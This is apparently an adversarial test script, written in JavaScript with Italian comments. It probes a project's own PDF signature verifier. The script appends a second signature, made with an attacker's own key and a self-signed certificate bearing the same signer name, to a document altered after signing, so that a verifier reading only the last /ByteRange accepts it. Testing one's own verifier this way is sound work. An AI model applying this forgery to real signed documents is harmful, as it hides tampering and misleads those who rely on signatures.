/**
 * Collaudo avversariale — l'esca.
 *
 * Domanda: il nostro motore verifica il documento, o verifica l'ULTIMA cosa che nel file somiglia
 * a una firma? `verify.js` individua il campo firma con `lastIndexOf('/ByteRange')`, cioe su byte
 * che stanno DOPO la firma e che chiunque puo appendere.
 *
 * Qui l'attaccante fa la parte dell'attaccante: prende il PDF gia manomesso con l'attacco 2
 * (importo cambiato dopo la firma di Lorenzo) e ci appende un secondo dizionario di firma, con una
 * SUA coppia di chiavi e un SUO certificato autofirmato che dichiara lo stesso Common Name.
 * Quella firma e matematicamente ineccepibile: copre tutto il file nuovo, e valida davvero.
 *
 * Non serve la chiave di Lorenzo. Serve solo che il verificatore guardi l'ultima firma invece di
 * tutte, e che non dica di chi e.
 */

import { readFileSync, writeFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'

import { generateKeyPair } from '../../../src/core/keys.js'
import { buildSelfSigned } from '../../../src/core/certificate.js'
import { buildSignedData } from '../../../src/core/cms.js'
import { digestCovered, injectSignature } from '../../../src/core/pades.js'

const OUT = join(dirname(fileURLToPath(import.meta.url)), 'out')
const base = readFileSync(join(OUT, 'attacco2-reale.pdf')) // gia manomesso dopo la firma
const baseText = base.toString('latin1')

const prev = Number(/startxref\s+(\d+)\s+%%EOF\s*$/.exec(baseText)[1])
const idText = /\/ID\s*(\[[^\]]*\])/.exec(baseText)[1]

const PADDING = 2048 // byte di firma; il buco e il doppio in cifre esadecimali
const ZERI = '0'.repeat(10) // i numeri del /ByteRange scritti a larghezza fissa: niente punto fisso

const objNum = 9
const sigText =
  `${objNum} 0 obj\n` +
  '<< /Type /Sig\n' +
  '   /Filter /Adobe.PPKLite\n' +
  '   /SubFilter /ETSI.CAdES.detached\n' +
  `   /ByteRange [${ZERI} ${ZERI} ${ZERI} ${ZERI}]\n` +
  `   /Contents <${'0'.repeat(PADDING * 2)}>\n` +
  '>>\n' +
  'endobj\n'

const objOffset = base.length + 0
let update = sigText
const xrefAt = base.length + update.length
update += `xref\n${objNum} 1\n${String(objOffset).padStart(10, '0')} 00000 n \n`
update += `trailer\n<< /Size ${objNum + 1} /Root 1 0 R /Prev ${prev} /ID ${idText} >>\n`
update += `startxref\n${xrefAt}\n%%EOF\n`

let bytes = Buffer.concat([base, Buffer.from(update, 'latin1')])
let text = bytes.toString('latin1')

// il buco: le parentesi angolari comprese, come vuole la convenzione
const brAt = text.lastIndexOf('/ByteRange [')
const contentsStart = text.indexOf('<', text.lastIndexOf('/Contents '))
const contentsEnd = text.indexOf('>', contentsStart)
const byteRange = [0, contentsStart, contentsEnd + 1, bytes.length - (contentsEnd + 1)]

// riscrittura dei quattro numeri, a larghezza invariata: il file non si sposta di un byte
const scritti = byteRange.map((n) => String(n).padStart(10, '0')).join(' ')
bytes.write(`/ByteRange [${scritti}]`, brAt, 'latin1')

// --- la firma dell'attaccante, con le SUE chiavi ----------------------------------------
const { privateKey, publicKey } = await generateKeyPair()
const signingTime = new Date('2026-08-11T09:30:00Z')
const { certDer } = await buildSelfSigned({
  publicKey,
  privateKey,
  subjectCN: 'Lorenzo Rossi (demo, non valido legalmente)', // lo stesso nome: nessuno lo controlla
  now: signingTime,
})
const messageDigest = await digestCovered(new Uint8Array(bytes), byteRange)
const { cmsDer } = await buildSignedData({ messageDigest, certDer, privateKey, signingTime })
const firmato = injectSignature(new Uint8Array(bytes), contentsStart, cmsDer)

writeFileSync(join(OUT, 'esca.pdf'), firmato)
console.log(
  JSON.stringify(
    { lunghezza: firmato.length, byteRange, contentsStart, contentsEnd, prev, xrefAt }, null, 2),
)
